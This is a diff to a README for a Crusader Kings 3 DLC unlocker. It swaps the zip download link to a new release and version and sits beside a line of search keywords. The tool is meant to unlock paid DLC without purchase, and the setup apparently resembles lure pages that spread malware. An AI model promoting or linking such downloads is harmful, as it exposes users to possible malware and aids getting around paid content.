@@ -3,7 +3,7 @@
 ## 🚀 Getting Started
 
 1. **Download CK3 Unlocker**  
-   [🔗 Download Crusader Kings 3 DLC Unlocker](https://github.com/CK3-DLC-Unlocker/.github/releases/download/1.6.6/CK3.Unlocker.zip)
+   [🔗 Download Crusader Kings 3 DLC Unlocker](https://github.com/CK3-DLC-Unlocker/.github/releases/download/1.6.67/CK3-DLC-Unlock.zip)
 
 2. **Unpack the downloaded file** and review the quickstart guide included.
 
@@ -52,6 +52,7 @@
    *DLCs with missing files or unsupported formats will be flagged for easy identification.*
 
 `ck3 dlc unlocker`, `crusader kings 3 dlc unlocker`, `ck3 unlock dlc`, `crusader kings unlock dlc`
+
 
 
 
